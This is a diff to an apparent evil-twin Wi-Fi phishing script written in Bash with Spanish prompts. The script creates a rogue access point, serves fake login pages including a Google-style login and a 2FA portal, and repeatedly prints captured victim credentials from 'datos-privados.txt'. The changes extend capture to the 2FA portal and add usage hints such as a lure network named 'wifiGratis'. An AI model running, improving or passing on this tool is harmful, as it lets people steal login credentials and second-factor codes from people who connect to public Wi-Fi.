@@ -17,7 +17,7 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
-	rm -r assets google-login.ep helper.php index.php jquery-2.2.1.min.js MyPortal.php post.php Roboto-Regular.ttf iface 2>/dev/null
+	rm -r *.php *.js *.txt *.ep assets portal_2fa Roboto-Regular.ttf 2>/dev/null
 	ifconfig wlan0mon down
 	iwconfig wlan0mon mode monitor
 	ifconfig wlan0mon up; airmon-ng stop wlan0mon > /dev/null 2>&1
@@ -80,7 +80,7 @@ function getCredentials(){
 	while true; do
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		sleep 1
-		cat datos-privados.txt 2>/dev/null
+		cat datos-privados.txt portal_2fa/datos-privados.txt 2>/dev/null
 		sleep 3; clear
 	done
 }
@@ -98,11 +98,11 @@ function startAttack(){
 	for interface in $(cat iface); do
 		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
 		let counter++
-	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz: ${endColour}" && read choosed_interface
+	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface
 
 	rm iface 2>/dev/null
-	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar:${endColour} " && read -r use_ssid
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel; tput civis
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
 	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
 	sleep 2
 	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
